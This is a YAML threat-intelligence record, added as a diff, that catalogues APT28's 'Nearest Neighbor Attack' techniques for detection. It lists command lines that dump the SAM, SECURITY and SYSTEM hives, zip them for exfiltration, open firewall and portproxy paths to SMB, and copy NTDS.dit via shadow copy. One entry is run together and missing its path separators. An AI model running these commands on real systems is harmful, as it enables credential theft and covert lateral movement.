@@ -1,0 +1,103 @@
+description: "A Russian APT group (GruesomeLarch) used a \u201CNearest Neighbor Attack\u201D\
+  \ to gain Wi\u2011Fi access to a target organization by compromising adjacent organizations\
+  \ and leveraging living\u2011off\u2011the\u2011land techniques, including registry\
+  \ hive export, file deletion with Cipher.exe, and netsh port forwarding."
+attribution: GruesomeLarch (APT28, Forest Blizzard, Sofacy, Fancy Bear)
+malware_families:
+- GooseEgg
+TTPs:
+  processes:
+  - servtask.bat
+  - DefragmentSrv.exe
+  - DefragmentSrv.bat
+  - wayzgoose52.dll
+  - Cipher.exe
+  - netshcmd.exe
+  - cmd.exe
+  - powershell
+  - vssadmin.exe
+  commandline:
+  - reg save hklmsam C:\ProgramData\sam.sav
+  - reg save hklmsecurity C:\ProgramData\security.sav
+  - reg save hklmsystem C:\ProgramData\system.save
+  - powershell -c Get-ChildItem C:\ProgramData\sam.sav, C:\ProgramData\security.sav,
+    C:\ProgramData\system.save ^| Compress-Archive -DestinationPath C:\ProgramData\out.zip
+  - cmd.exe /C netsh advfirewall firewall add rule name="Remote Event Log Management
+    SMB" dir=in action=allow protocol=tcp localport=12345 > C:\Windows\Temp\MSI28122Ac.LOG
+    2>&1
+  - cmd.exe /C netsh interface portproxy add v4tov4 listenaddress=172.33.xx.xx listenport=12345
+    connectaddress=172.20.xx.xx connectport=445 > C:\Windows\Temp\MSI2cBfA24.LOG 2>&1
+  - '''C:\ProgramData\servtask.bat'' reg save hklmsam C:\ProgramData\sam.sav'
+  - '''C:\ProgramData\servtask.bat'' reg save hklmsecurity C:\ProgramData\security.sav'
+  - '''C:\ProgramData\servtask.bat'' reg save hklmsystem C:\ProgramData\system.save'
+  - '''C:\ProgramData\servtask.bat'' powershell -c Get-ChildItem C:\ProgramData\sam.save,
+    C:\ProgramData\security.save, C:\ProgramData\system.save | Compress-Archive -DestinationPath
+    C:\ProgramData\out.zip'
+  - '''netshcmd.exe'' /C netsh advfirewall firewall add rule name="Remote Event Log
+    Management SMB" dir=in action=allow protocol=tcp localport=12345 > C:\Windows\Temp\MSI28122Ac.LOG
+    2>&1'
+  - '''cmd.exe'' /C netsh interface portproxy add v4tov4 listenaddress=172.33.xx.xx
+    listenport=12345 connectaddress=172.20.xx.xx connectport=445 > C:\Windows\Temp\MSI2cBfA24.LOG
+    2>&1'
+  - '''Cipher.exe'' cmd /c cipher /W:Cvssadmin create shadow /for C: /quietntds.ditcopy
+    \?GLOBALROOTDeviceHarddiskVolumeShadowCopy1WindowsNTDSNTDS.dit [dest]copy \?GLOBALROOTDeviceHarddiskVolumeShadowCopy1WindowsSystem32configSYSTEM
+    [dest]'
+  - '''powershell'' -c "& { Add-Type -Assembly ''System.IO.Compression.FileSystem'';
+    [IO.Compression.ZipFile]::CreateFromDirectory($path1'', ''$path2'');}" > C:\Windows\Temp\b2rMBPL.tmp
+    2>&1'
+  powershell:
+  - powershell -c Get-ChildItem C:\ProgramData\sam.sav, C:\ProgramData\security.sav,
+    C:\ProgramData\system.save ^| Compress-Archive -DestinationPath C:\ProgramData\out.zip
+  scripting_engine:
+  - '''C:\ProgramData\servtask.bat'''
+  registry_keys:
+  - hklm\sam
+  - hklm\security
+  - hklm\system
+  image_load: []
+  network_connections:
+  - process: netshcmd.exe
+    destination_address: 172.33.xx.xx
+    port: 12345
+  - process: cmd.exe
+    destination_address: 172.20.xx.xx
+    port: 445
+  file_activity:
+  - C:\ProgramData\servtask.bat
+  - DefragmentSrv.zip
+  - C:\ProgramData\DefragmentSrv.exe
+  - C:\ProgramData\DefragmentSrv.bat
+  - C:\ProgramData\wayzgoose52.dll
+  - C:\ProgramData\sam.sav
+  - C:\ProgramData\security.sav
+  - C:\ProgramData\system.save
+  - C:\ProgramData\out.zip
+  - C:\\ProgramData\\out.zip
+  - C:\\ProgramData\\DefragmentSrv.zip
+  - C:\\Windows\\Temp\\MSI28122Ac.LOG
+  - C:\\Windows\\Temp\\MSI2cBfA24.LOG
+  - C:\\Windows\\Temp\\b2rMBPL.tmp
+  persistence: []
+  process_relations:
+  - parent: servtask.bat
+    child: powershell
+  - parent: servtask.bat
+    child: Cipher.exe
+  - parent: servtask.bat
+    child: netshcmd.exe
+  - parent: servtask.bat
+    child: cmd.exe
+IOCs:
+  hashes: []
+  ips:
+  - 172.33.xx.xx
+  - 172.20.xx.xx
+  domains: []
+  urls: []
+authors:
+- Sean Koessel
+- Steven Adair
+- Tom Lancaster
+reference: https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access
+date_of_publication: November 22, 2024
+file_creation_date: October 05, 2025
